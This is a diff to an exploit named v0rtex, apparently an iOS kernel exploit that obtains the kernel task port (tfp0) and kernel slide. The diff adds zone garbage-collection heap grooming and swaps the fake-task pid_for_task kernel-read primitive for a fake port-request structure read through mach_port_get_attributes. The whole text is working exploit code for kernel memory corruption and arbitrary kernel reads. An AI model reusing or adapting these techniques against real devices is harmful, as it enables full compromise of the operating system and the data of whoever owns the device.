@@ -191,6 +191,8 @@ static kern_return_t my_mach_port_get_context(task_t task, mach_port_name_t name
     return ret;
 }
 
+// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
+// Prepare everything - sched_yield() - fire.
 static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len)
 {
 #pragma pack(4)
@@ -368,6 +370,17 @@ typedef struct {
     natural_t ip_sorights;
 } kport_t;
 
+typedef struct {
+    union {
+        kptr_t port;
+        natural_t index;
+    } notify;
+    union {
+        natural_t name;
+        kptr_t size;
+    } name;
+} kport_request_t;
+
 typedef union
 {
     struct {
@@ -451,15 +464,18 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
 
     mach_port_t realport = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
-    if(ret != KERN_SUCCESS)
+    LOG("realport: %x, %s", realport, mach_error_string(ret));
+    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(realport))
     {
-        LOG("mach_port_allocate: %s", mach_error_string(ret));
         goto out1;
     }
-    if(!MACH_PORT_VALID(realport))
+
+    sched_yield();
+    // Clean out full pages already in freelists
+    ret = my_mach_zone_force_gc(host);
+    if(ret != KERN_SUCCESS)
     {
-        LOG("realport: %x", realport);
-        ret = KERN_FAILURE;
+        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
         goto out1;
     }
 
@@ -501,7 +517,6 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         }
     }
 
-    LOG("realport: %x", realport);
     LOG("port: %x", port);
 
     ret = _kernelrpc_mach_port_insert_right_trap(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
@@ -741,16 +756,9 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         goto out3;
     }
 
-    ktask_t ktask;
-    ktask.a.lock.data = 0x0;
-    ktask.a.lock.type = 0x22;
-    ktask.a.ref_count = 100;
-    ktask.a.active = 1;
-    ktask.b.itk_self = 1;
-    ktask.c.bsd_info = 0;
-
-    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
-    kport.ip_kobject = (kptr_t)&ktask;
+    kport_request_t kreq;
+    memset(&kreq, 0, sizeof(kreq));
+    kport.ip_requests = (kptr_t)&kreq;
 
     for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
@@ -764,16 +772,17 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         goto out3;
     }
 
-#define KREAD(addr, buf, size) \
+#define KREAD(addr, buf, len) \
 do \
 { \
-    for(size_t i = 0; i < ((size) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
+    for(size_t i = 0; i < ((len) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
     { \
-        ktask.c.bsd_info = (addr + i * sizeof(uint32_t)) - OFFSET_PROC_P_PID; \
-        ret = pid_for_task(fakeport, (int*)((uint32_t*)(buf) + i)); \
+        kreq.name.size = (addr + i * sizeof(uint32_t)); \
+        mach_msg_type_number_t outsz = 1; \
+        ret = mach_port_get_attributes(self, fakeport, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)((uint32_t*)(buf) + i), &outsz); \
         if(ret != KERN_SUCCESS) \
         { \
-            LOG("pid_for_task: %s", mach_error_string(ret)); \
+            LOG("mach_port_get_attributes: %s", mach_error_string(ret)); \
             goto out3; \
         } \
     } \
@@ -841,6 +850,7 @@ do \
 
     kport.ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
     kport.ip_kobject = (kptr_t)&object;
+    kport.ip_requests = 0;
 
     for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
@@ -912,6 +922,7 @@ do \
     LOG("realhost: %x (host: %x)", realhost, host);
 
     ktask_t zm_task;
+    memset(&zm_task, 0, sizeof(zm_task));
     zm_task.a.lock.data = 0x0;
     zm_task.a.lock.type = 0x22;
     zm_task.a.ref_count = 100;
@@ -925,6 +936,7 @@ do \
     }
 
     ktask_t km_task;
+    memset(&km_task, 0, sizeof(km_task));
     km_task.a.lock.data = 0x0;
     km_task.a.lock.type = 0x22;
     km_task.a.ref_count = 100;
